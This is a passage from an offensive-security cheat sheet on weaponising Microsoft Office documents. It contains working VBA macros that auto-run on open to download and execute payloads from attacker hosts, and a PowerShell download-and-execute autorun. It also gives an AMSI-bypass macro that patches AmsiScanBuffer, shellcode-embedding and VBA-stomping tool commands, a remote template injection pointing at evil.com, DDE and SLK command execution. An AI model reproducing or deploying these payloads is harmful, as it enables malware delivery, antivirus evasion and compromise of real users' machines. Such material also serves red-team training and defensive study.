</span></span><span style=display:flex><span>echo x86.bin | macro_pack.exe -t SHELLCODE -o -G test.pptm <span style=color:#960050;background-color:#1e0010></span>keep-alive
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;x86.bin&#34;</span> <span style=color:#e6db74>&#34;x64.bin&#34;</span> | macro_pack.exe -t AUTOSHELLCODE -o <span style=color:#960050;background-color:#1e0010></span>autopack -G sc_auto.doc
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;http://192.168.5.10:8080/x32calc.bin&#34;</span> <span style=color:#e6db74>&#34;http://192.168.5.10:8080/x64calc.bin&#34;</span> | macro_pack.exe -t DROPPER_SHELLCODE -o --shellcodemethod=ClassicIndirect -G samples\sc_dl.xls
</span></span></code></pre></div><h2 id=docm---badassmacros>DOCM - BadAssMacros
<a class=anchor href=#docm---badassmacros>#</a></h2><blockquote><p>C# based automated Malicous Macro Generator.</p></blockquote><ul><li><a href=https://github.com/Inf0secRabbit/BadAssMacros>https://github.com/Inf0secRabbit/BadAssMacros</a></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>BadAssMacros.exe -h
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Create VBA for classic shellcode injection from raw shellcode</span>
</span></span><span style=display:flex><span>BadAssMacros.exe -i &lt;path_to_raw_shellcode_file&gt; -w &lt;doc/excel&gt; -p no -s classic -c &lt;caesar_shift_value&gt; -o &lt;path_to_output_file&gt;
</span></span><span style=display:flex><span>BadAssMacros.exe -i .\Desktop\payload.bin -w doc -p no -s classic -c <span style=color:#ae81ff>23</span> -o .\Desktop\output.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Create VBA for indirect shellcode injection from raw shellcode</span>
</span></span><span style=display:flex><span>BadAssMacros.exe -i &lt;path_to_raw_shellcode_file&gt; -w &lt;doc/excel&gt; -p no -s indirect -o &lt;path_to_output_file&gt;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># List modules inside Doc/Excel file</span>
</span></span><span style=display:flex><span>BadAssMacros.exe -i &lt;path_to_doc/excel_file&gt; -w &lt;doc/excel&gt; -p yes -l
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Purge Doc/Excel file</span>
</span></span><span style=display:flex><span>BadAssMacros.exe -i &lt;path_to_doc/excel_file&gt; -w &lt;doc/excel&gt; -p yes -o &lt;path_to_output_file&gt; -m &lt;module_name&gt;
</span></span></code></pre></div><h2 id=docm---cactustorch-vba-module>DOCM - CACTUSTORCH VBA Module
<a class=anchor href=#docm---cactustorch-vba-module>#</a></h2><blockquote><p>CactusTorch is leveraging the DotNetToJscript technique to load a .Net compiled binary into memory and execute it from vbscript</p></blockquote><ul><li><a href=https://github.com/mdsecactivebreach/CACTUSTORCH>https://github.com/mdsecactivebreach/CACTUSTORCH</a></li><li><a href=https://github.com/tyranid/DotNetToJScript/>https://github.com/tyranid/DotNetToJScript/</a></li><li>CACTUSTORCH - DotNetToJScript all the things - <a href=https://youtu.be/YiaKb8nHFSY>https://youtu.be/YiaKb8nHFSY</a></li><li>CACTUSTORCH - CobaltStrike Aggressor Script Addon - <a href="https://www.youtube.com/watch?v=_pwH6a-6yAQ">https://www.youtube.com/watch?v=_pwH6a-6yAQ</a></li></ul><ol><li>Import <strong>.cna</strong> in Cobalt Strike</li><li>Generate a new VBA payload from the CACTUSTORCH menu</li><li>Download DotNetToJscript</li><li>Compile it<ul><li><strong>DotNetToJscript.exe</strong> - responsible for bootstrapping C# binaries (supplied as input) and converting them to JavaScript or VBScript</li><li><strong>ExampleAssembly.dll</strong> - the C# assembly that will be given to DotNetToJscript.exe. In default project configuration, the assembly just pops a message box with the text &ldquo;test&rdquo;</li></ul></li><li>Execute <strong>DotNetToJscript.exe</strong> and supply it with the ExampleAssembly.dll, specify the output file and the output type<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span>DotNetToJScript.exeExampleAssembly.dll -l vba -o test.vba -c cactusTorch
</span></span></code></pre></div></li><li>Use the generated code to replace the hardcoded binary in CactusTorch</li></ol><h2 id=docm---mmg-with-custom-dl--exec>DOCM - MMG with Custom DL + Exec
<a class=anchor href=#docm---mmg-with-custom-dl--exec>#</a></h2><ol><li>Custom Download in first Macro to &ldquo;C:\Users\Public\beacon.exe&rdquo;</li><li>Create a custom binary execute using MMG</li><li>Merge both Macro</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span>git clone https<span style=color:#960050;background-color:#1e0010>:</span>//github.com/Mr-Un1k0d3r/MaliciousMacroGenerator
</span></span><span style=display:flex><span>python MMG.py configs/generic-cmd.json malicious.vba
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;description&#34;</span><span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#e6db74>&#34;Generic command exec payload\nEvasion technique set to none&#34;</span>,
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;template&#34;</span><span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#e6db74>&#34;templates/payloads/generic-cmd-template.vba&#34;</span>,
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;varcount&#34;</span><span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>152</span>,
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;encodingoffset&#34;</span><span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>5</span>,
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;chunksize&#34;</span><span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>180</span>,
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;encodedvars&#34;</span><span style=color:#960050;background-color:#1e0010>:</span> 	{},
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;vars&#34;</span><span style=color:#960050;background-color:#1e0010>:</span> 	[],
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;evasion&#34;</span><span style=color:#960050;background-color:#1e0010>:</span> 	[<span style=color:#e6db74>&#34;encoder&#34;</span>],
</span></span><span style=display:flex><span>	<span style=color:#e6db74>&#34;payload&#34;</span><span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#e6db74>&#34;cmd.exe /c C:\\Users\\Public\\beacon.exe&#34;</span>
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-vb data-lang=vb><span style=display:flex><span><span style=color:#66d9ef>Private</span> <span style=color:#66d9ef>Declare</span> PtrSafe <span style=color:#66d9ef>Function</span> <span style=color:#a6e22e>URLDownloadToFile</span> <span style=color:#66d9ef>Lib</span> <span style=color:#e6db74>&#34;urlmon&#34;</span> <span style=color:#66d9ef>Alias</span> <span style=color:#e6db74>&#34;URLDownloadToFileA&#34;</span> (<span style=color:#66d9ef>ByVal</span> pCaller <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByVal</span> szURL <span style=color:#f92672>As</span> <span style=color:#66d9ef>String</span>, <span style=color:#66d9ef>ByVal</span> szFileName <span style=color:#f92672>As</span> <span style=color:#66d9ef>String</span>, <span style=color:#66d9ef>ByVal</span> dwReserved <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByVal</span> lpfnCB <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>) <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>Public</span> <span style=color:#66d9ef>Function</span> <span style=color:#a6e22e>DownloadFileA</span>(<span style=color:#66d9ef>ByVal</span> URL <span style=color:#f92672>As</span> <span style=color:#66d9ef>String</span>, <span style=color:#66d9ef>ByVal</span> DownloadPath <span style=color:#f92672>As</span> <span style=color:#66d9ef>String</span>) <span style=color:#f92672>As</span> <span style=color:#66d9ef>Boolean</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>On</span> <span style=color:#66d9ef>Error</span> <span style=color:#66d9ef>GoTo</span> Failed
</span></span><span style=display:flex><span>    DownloadFileA <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>&#39;As directory must exist, this is a check
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>If</span> CreateObject(<span style=color:#e6db74>&#34;Scripting.FileSystemObject&#34;</span>).FolderExists(CreateObject(<span style=color:#e6db74>&#34;Scripting.FileSystemObject&#34;</span>).GetParentFolderName(DownloadPath)) <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span> <span style=color:#66d9ef>Then</span> <span style=color:#66d9ef>Exit</span> <span style=color:#66d9ef>Function</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>Dim</span> returnValue <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
</span></span><span style=display:flex><span>    returnValue <span style=color:#f92672>=</span> URLDownloadToFile(0, URL, DownloadPath, 0, 0)
</span></span><span style=display:flex><span>    <span style=color:#75715e>&#39;If return value is 0 and the file exist, then it is considered as downloaded correctly
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    DownloadFileA <span style=color:#f92672>=</span> (returnValue <span style=color:#f92672>=</span> 0) <span style=color:#f92672>And</span> (Len(Dir(DownloadPath)) <span style=color:#f92672>&gt;</span> 0)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>Exit</span> <span style=color:#66d9ef>Function</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>Failed</span>:
</span></span><span style=display:flex><span><span style=color:#66d9ef>End</span> <span style=color:#66d9ef>Function</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>Sub</span> <span style=color:#a6e22e>AutoOpen</span>()
</span></span><span style=display:flex><span>    DownloadFileA <span style=color:#e6db74>&#34;http://10.10.10.10/macro.exe&#34;</span>, <span style=color:#e6db74>&#34;C:\\Users\\Public\\beacon.exe&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>End</span> <span style=color:#66d9ef>Sub</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>Sub</span> <span style=color:#a6e22e>Auto_Open</span>()
</span></span><span style=display:flex><span>    DownloadFileA <span style=color:#e6db74>&#34;http://10.10.10.10/macro.exe&#34;</span>, <span style=color:#e6db74>&#34;C:\\Users\\Public\\beacon.exe&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>End</span> <span style=color:#66d9ef>Sub</span>
</span></span></code></pre></div><h2 id=docm---activex-based-inkpicture-control-painted-event-autorun-macro>DOCM - ActiveX-based (InkPicture control, Painted event) Autorun macro
<a class=anchor href=#docm---activex-based-inkpicture-control-painted-event-autorun-macro>#</a></h2><p>Go to <strong>Developer tab</strong> on ribbon <code>-> Insert -> More Controls -> Microsoft InkPicture Control</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-vb data-lang=vb><span style=display:flex><span><span style=color:#66d9ef>Private</span> <span style=color:#66d9ef>Sub</span> <span style=color:#a6e22e>InkPicture1_Painted</span>(<span style=color:#66d9ef>ByVal</span> hDC <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, <span style=color:#66d9ef>ByVal</span> Rect <span style=color:#f92672>As</span> MSINKAUTLib.IInkRectangle)
</span></span><span style=display:flex><span>Run <span style=color:#f92672>=</span> Shell(<span style=color:#e6db74>&#34;cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile(&#39;https://&lt;host&gt;/file.exe&#39;,&#39;file.exe&#39;);Start-Process &#39;file.exe&#39;&#34;</span>, vbNormalFocus)
</span></span><span style=display:flex><span><span style=color:#66d9ef>End</span> <span style=color:#66d9ef>Sub</span>
</span></span></code></pre></div><h2 id=vba-obfuscation>VBA Obfuscation
<a class=anchor href=#vba-obfuscation>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span><span style=color:#75715e># https://www.youtube.com/watch?v=L0DlPOLx2k0</span>
</span></span><span style=display:flex><span>$ git clone https<span style=color:#960050;background-color:#1e0010>:</span>//github.com/bonnetn/vba-obfuscator
</span></span><span style=display:flex><span>$ cat example_macro/download_payload.vba | docker run -i --rm bonnetn/vba-obfuscator /dev/stdin
</span></span></code></pre></div><h2 id=vba-purging>VBA Purging
<a class=anchor href=#vba-purging>#</a></h2><p><strong>VBA Stomping</strong>: This technique allows attackers to remove compressed VBA code from Office documents and still execute malicious macros without many of the VBA keywords that AV engines had come to rely on for detection. == Removes P-code.</p><p>:warning: VBA stomping is not effective against Excel 97-2003 Workbook (.xls) format.</p><h3 id=officepurge>OfficePurge
<a class=anchor href=#officepurge>#</a></h3><ul><li><a href=https://github.com/fireeye/OfficePurge/releases/download/v1.0/OfficePurge.exe>https://github.com/fireeye/OfficePurge/releases/download/v1.0/OfficePurge.exe</a></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>OfficePurge.exe -d word <span style=color:#f92672>-f</span> .\malicious.doc -m NewMacros
</span></span><span style=display:flex><span>OfficePurge.exe -d excel <span style=color:#f92672>-f</span> .\payroll.xls -m Module1
</span></span><span style=display:flex><span>OfficePurge.exe -d publisher <span style=color:#f92672>-f</span> .\donuts.pub -m ThisDocument
</span></span><span style=display:flex><span>OfficePurge.exe -d word <span style=color:#f92672>-f</span> .\malicious.doc -l
</span></span></code></pre></div><h3 id=evilclippy>EvilClippy
<a class=anchor href=#evilclippy>#</a></h3><blockquote><p>Evil Clippy uses the OpenMCDF library to manipulate CFBF files.
Evil Clippy compiles perfectly fine with the Mono C# compiler and has been tested on Linux, OSX and Windows.
If you want to manipulate CFBF files manually, then FlexHEX is one of the best editors for this.</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span><span style=color:#75715e># OSX/Linux</span>
</span></span><span style=display:flex><span>mcs /reference<span style=color:#960050;background-color:#1e0010>:</span>OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out<span style=color:#960050;background-color:#1e0010>:</span>EvilClippy.exe *.cs 
</span></span><span style=display:flex><span><span style=color:#75715e># Windows</span>
</span></span><span style=display:flex><span>csc /reference<span style=color:#960050;background-color:#1e0010>:</span>OpenMcdf.dll,System.IO.Compression.FileSystem.dll /out<span style=color:#960050;background-color:#1e0010>:</span>EvilClippy.exe *.cs 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>EvilClippy.exe -s fake.vbs -g -r cobaltstrike.doc
</span></span><span style=display:flex><span>EvilClippy.exe -s fakecode.vba -t 2016x86 macrofile.doc
</span></span><span style=display:flex><span>EvilClippy.exe -s fakecode.vba -t 2013x64 macrofile.doc
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># make macro code unaccessible is to mark the project as locked and unviewable: -u</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Evil Clippy can confuse pcodedmp and many other analysis tools with the -r flag.</span>
</span></span><span style=display:flex><span>EvilClippy.exe -r macrofile.doc
</span></span></code></pre></div><h2 id=vba---offensive-security-template>VBA - Offensive Security Template
<a class=anchor href=#vba---offensive-security-template>#</a></h2><ul><li>Reverse Shell VBA - <a href=https://github.com/JohnWoodman/VBA-Macro-Reverse-Shell/blob/main/VBA-Reverse-Shell.vba>https://github.com/JohnWoodman/VBA-Macro-Reverse-Shell/blob/main/VBA-Reverse-Shell.vba</a></li><li>Process Dumper - <a href=https://github.com/JohnWoodman/VBA-Macro-Dump-Process>https://github.com/JohnWoodman/VBA-Macro-Dump-Process</a></li><li>RunPE - <a href=https://github.com/itm4n/VBA-RunPE>https://github.com/itm4n/VBA-RunPE</a></li><li>Spoof Parent - <a href=https://github.com/py7hagoras/OfficeMacro64>https://github.com/py7hagoras/OfficeMacro64</a></li><li>AMSI Bypass - <a href=https://github.com/outflanknl/Scripts/blob/master/AMSIbypasses.vba>https://github.com/outflanknl/Scripts/blob/master/AMSIbypasses.vba</a></li><li>amsiByPassWithRTLMoveMemory - <a href=https://gist.github.com/DanShaqFu/1c57c02660b2980d4816d14379c2c4f3>https://gist.github.com/DanShaqFu/1c57c02660b2980d4816d14379c2c4f3</a></li><li>VBA macro spawning a process with a spoofed parent - <a href=https://github.com/christophetd/spoofing-office-macro/blob/master/macro64.vba>https://github.com/christophetd/spoofing-office-macro/blob/master/macro64.vba</a></li></ul><h2 id=vba---amsi>VBA - AMSI
<a class=anchor href=#vba---amsi>#</a></h2><blockquote><p>The Office VBA integration with AMSI is made up of three parts: (a) logging macro behavior, (b) triggering a scan on suspicious behavior, and (c) stopping a malicious macro upon detection. <a href=https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/>https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/</a></p></blockquote><p><img src=https://www.microsoft.com/security/blog/wp-content/uploads/2018/09/fig2-runtime-scanning-amsi-8-1024x482.png alt></p><p>:warning: It appears that p-code based attacks where the VBA code is stomped will still be picked up by the AMSI engine (e.g. files manipulated by our tool EvilClippy).</p><p>The AMSI engine only hooks into VBA, we can bypass it by using Excel 4.0 Macro</p><ul><li>AMSI Trigger - <a href=https://github.com/synacktiv/AMSI-Bypass>https://github.com/synacktiv/AMSI-Bypass</a></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-vb data-lang=vb><span style=display:flex><span><span style=color:#66d9ef>Private</span> <span style=color:#66d9ef>Declare</span> PtrSafe <span style=color:#66d9ef>Function</span> <span style=color:#a6e22e>GetProcAddress</span> <span style=color:#66d9ef>Lib</span> <span style=color:#e6db74>&#34;kernel32&#34;</span> (<span style=color:#66d9ef>ByVal</span> hModule <span style=color:#f92672>As</span> LongPtr, <span style=color:#66d9ef>ByVal</span> lpProcName <span style=color:#f92672>As</span> <span style=color:#66d9ef>String</span>) <span style=color:#f92672>As</span> LongPtr
</span></span><span style=display:flex><span><span style=color:#66d9ef>Private</span> <span style=color:#66d9ef>Declare</span> PtrSafe <span style=color:#66d9ef>Function</span> <span style=color:#a6e22e>LoadLibrary</span> <span style=color:#66d9ef>Lib</span> <span style=color:#e6db74>&#34;kernel32&#34;</span> <span style=color:#66d9ef>Alias</span> <span style=color:#e6db74>&#34;LoadLibraryA&#34;</span> (<span style=color:#66d9ef>ByVal</span> lpLibFileName <span style=color:#f92672>As</span> <span style=color:#66d9ef>String</span>) <span style=color:#f92672>As</span> LongPtr
</span></span><span style=display:flex><span><span style=color:#66d9ef>Private</span> <span style=color:#66d9ef>Declare</span> PtrSafe <span style=color:#66d9ef>Function</span> <span style=color:#a6e22e>VirtualProtect</span> <span style=color:#66d9ef>Lib</span> <span style=color:#e6db74>&#34;kernel32&#34;</span> (lpAddress <span style=color:#f92672>As</span> Any, <span style=color:#66d9ef>ByVal</span> dwSize <span style=color:#f92672>As</span> LongPtr, <span style=color:#66d9ef>ByVal</span> flNewProtect <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>, lpflOldProtect <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>) <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>Private</span> <span style=color:#66d9ef>Declare</span> PtrSafe <span style=color:#66d9ef>Sub</span> <span style=color:#a6e22e>CopyMemory</span> <span style=color:#66d9ef>Lib</span> <span style=color:#e6db74>&#34;kernel32&#34;</span> <span style=color:#66d9ef>Alias</span> <span style=color:#e6db74>&#34;RtlMoveMemory&#34;</span> (Destination <span style=color:#f92672>As</span> Any, Source <span style=color:#f92672>As</span> Any, <span style=color:#66d9ef>ByVal</span> Length <span style=color:#f92672>As</span> LongPtr)
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span><span style=color:#66d9ef>Private</span> <span style=color:#66d9ef>Sub</span> <span style=color:#a6e22e>Document_Open</span>()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>Dim</span> AmsiDLL <span style=color:#f92672>As</span> LongPtr
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>Dim</span> AmsiScanBufferAddr <span style=color:#f92672>As</span> LongPtr
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>Dim</span> result <span style=color:#f92672>As</span> <span style=color:#66d9ef>Long</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>Dim</span> MyByteArray(6) <span style=color:#f92672>As</span> <span style=color:#66d9ef>Byte</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>Dim</span> ArrayPointer <span style=color:#f92672>As</span> LongPtr
</span></span><span style=display:flex><span> 
</span></span><span style=display:flex><span>    MyByteArray(0) <span style=color:#f92672>=</span> 184 <span style=color:#75715e>&#39; 0xB8
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    MyByteArray(1) <span style=color:#f92672>=</span> 87  <span style=color:#75715e>&#39; 0x57
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    MyByteArray(2) <span style=color:#f92672>=</span> 0   <span style=color:#75715e>&#39; 0x00
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    MyByteArray(3) <span style=color:#f92672>=</span> 7   <span style=color:#75715e>&#39; 0x07
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    MyByteArray(4) <span style=color:#f92672>=</span> 128 <span style=color:#75715e>&#39; 0x80
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    MyByteArray(5) <span style=color:#f92672>=</span> 195 <span style=color:#75715e>&#39; 0xC3
</span></span></span><span style=display:flex><span><span style=color:#75715e></span> 
</span></span><span style=display:flex><span>    AmsiDLL <span style=color:#f92672>=</span> LoadLibrary(<span style=color:#e6db74>&#34;amsi.dll&#34;</span>)
</span></span><span style=display:flex><span>    AmsiScanBufferAddr <span style=color:#f92672>=</span> GetProcAddress(AmsiDLL, <span style=color:#e6db74>&#34;AmsiScanBuffer&#34;</span>)
</span></span><span style=display:flex><span>    result <span style=color:#f92672>=</span> VirtualProtect(<span style=color:#66d9ef>ByVal</span> AmsiScanBufferAddr, 5, 64, 0)
</span></span><span style=display:flex><span>    ArrayPointer <span style=color:#f92672>=</span> VarPtr(MyByteArray(0))
</span></span><span style=display:flex><span>    CopyMemory <span style=color:#66d9ef>ByVal</span> AmsiScanBufferAddr, <span style=color:#66d9ef>ByVal</span> ArrayPointer, 6
</span></span><span style=display:flex><span>     
</span></span><span style=display:flex><span><span style=color:#66d9ef>End</span> <span style=color:#66d9ef>Sub</span>
</span></span></code></pre></div><h2 id=docx---template-injection>DOCX - Template Injection
<a class=anchor href=#docx---template-injection>#</a></h2><p>:warning: Does not require &ldquo;Enable Macro&rdquo;</p><h3 id=remote-template>Remote Template
<a class=anchor href=#remote-template>#</a></h3><ol><li>A malicious macro is saved in a Word template .dotm file</li><li>Benign .docx file is created based on one of the default MS Word Document templates</li><li>Document from step 2 is saved as .docx</li><li>Document from step 3 is renamed to .zip</li><li>Document from step 4 gets unzipped</li><li><strong>.\word_rels\settings.xml.rels</strong> contains a reference to the template file. That reference gets replaced with a reference to our malicious macro created in step 1. File can be hosted on a web server (http) or webdav (smb).<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;Relationships</span> <span style=color:#a6e22e>xmlns=</span><span style=color:#e6db74>&#34;http://schemas.openxmlformats.org/package/2006/relationships&#34;</span><span style=color:#f92672>&gt;&lt;Relationship</span> <span style=color:#a6e22e>Id=</span><span style=color:#e6db74>&#34;rId1&#34;</span> <span style=color:#a6e22e>Type=</span><span style=color:#e6db74>&#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate&#34;</span> <span style=color:#a6e22e>Target=</span><span style=color:#e6db74>&#34;file:///C:\Users\mantvydas\AppData\Roaming\Microsoft\Templates\Polished%20resume,%20designed%20by%20MOO.dotx&#34;</span> <span style=color:#a6e22e>TargetMode=</span><span style=color:#e6db74>&#34;External&#34;</span><span style=color:#f92672>/&gt;&lt;/Relationships&gt;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span><span style=color:#f92672>&lt;Relationships</span> <span style=color:#a6e22e>xmlns=</span><span style=color:#e6db74>&#34;http://schemas.openxmlformats.org/package/2006/relationships&#34;</span><span style=color:#f92672>&gt;&lt;Relationship</span> <span style=color:#a6e22e>Id=</span><span style=color:#e6db74>&#34;rId1&#34;</span> <span style=color:#a6e22e>Type=</span><span style=color:#e6db74>&#34;http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate&#34;</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>Target=</span><span style=color:#e6db74>&#34;https://evil.com/malicious.dotm&#34;</span> <span style=color:#a6e22e>TargetMode=</span><span style=color:#e6db74>&#34;External&#34;</span><span style=color:#f92672>/&gt;&lt;/Relationships&gt;</span>
</span></span></code></pre></div></li><li>File gets zipped back up again and renamed to .docx</li></ol><h3 id=template-injections-tools>Template Injections Tools
<a class=anchor href=#template-injections-tools>#</a></h3><ul><li><a href=https://github.com/JohnWoodman/remoteInjector>https://github.com/JohnWoodman/remoteInjector</a></li><li><a href=https://github.com/ryhanson/phishery>https://github.com/ryhanson/phishery</a></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span>$ phishery -u https<span style=color:#960050;background-color:#1e0010>:</span>//secure.site.local/docs -i good.docx -o bad.docx
</span></span><span style=display:flex><span>[+] Opening Word document<span style=color:#960050;background-color:#1e0010>:</span> good.docx
</span></span><span style=display:flex><span>[+] Setting Word document template to<span style=color:#960050;background-color:#1e0010>:</span> https<span style=color:#960050;background-color:#1e0010>:</span>//secure.site.local/docs
</span></span><span style=display:flex><span>[+] Saving injected Word document to<span style=color:#960050;background-color:#1e0010>:</span> bad.docx
</span></span><span style=display:flex><span>[*] Injected Word document has been saved!
</span></span></code></pre></div><h2 id=docx---dde>DOCX - DDE
<a class=anchor href=#docx---dde>#</a></h2><ul><li>Insert > QuickPart > Field</li><li>Right Click > Toggle Field Code</li><li><code>{ DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" }</code></li></ul><h2 id=slk---excel>SLK - Excel
<a class=anchor href=#slk---excel>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-ps1 data-lang=ps1><span style=display:flex><span>ID;P
</span></span><span style=display:flex><span>O;E
</span></span><span style=display:flex><span>NN;NAuto_open;ER101C1;KOut Flank;F
</span></span><span style=display:flex><span>C;X1;Y101;K0;EEXEC(<span style=color:#e6db74>&#34;c:\shell.cmd&#34;</span>)
</span></span><span style=display:flex><span>C;X1;Y102;K0;EHALT()
</span></span><span style=display:flex><span>E
</span></span></code></pre></div><h2 id=references>References
<a class=anchor href=#references>#</a></h2><ul><li><a href=https://itm4n.github.io/vba-runpe-part1/>VBA RunPE Part 1 - itm4n</a></li><li><a href=https://itm4n.github.io/vba-runpe-part2/>VBA RunPE Part 2 - itm4n</a></li><li><a href=https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/>Office VBA AMSI Parting the veil on malicious macros - Microsoft</a></li><li><a href=https://outflank.nl/blog/2019/04/17/bypassing-amsi-for-vba/>Bypassing AMSI fro VBA - Outflank</a></li><li><a href=https://outflank.nl/blog/2019/05/05/evil-clippy-ms-office-maldoc-assistant/>Evil Clippy MS Office Maldoc Assistant - Outflank</a></li><li><a href=https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/>Old schoold evil execl 4.0 macros XLM - Outflank</a></li><li><a href=https://bytecod3r.io/excel-4-macro-generator-x86-x64/>Excel 4 Macro Generator x86/x64 - bytecod3r</a></li><li><a href=https://github.com/Pepitoh/VBad>VBad - Pepitoh</a></li><li><a href=https://d13ot9o61jdzpp.cloudfront.net/files/Excel%204.0%20Macro%20Functions%20Reference.pdf>Excel 4.0 Macro Function Reference PDF</a></li><li><a 